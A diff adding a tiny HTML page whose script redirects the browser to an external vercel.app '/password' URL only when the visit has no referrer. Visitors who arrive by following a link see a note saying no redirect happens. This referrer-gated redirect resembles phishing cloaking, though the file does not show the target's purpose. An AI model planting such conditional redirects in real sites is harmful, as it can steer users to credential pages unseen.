@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Redirecting...</title>
+  <script>
+    // Redirect ONLY if the visit was direct (typed/bookmarked)
+    if (document.referrer === "") {
+      window.location.href = "https://wazpx.vercel.app/password";
+    }
+  </script>
+</head>
+<body>
+  <p>If you’re seeing this, you came from another page — so no redirect.</p>
+</body>
+</html>
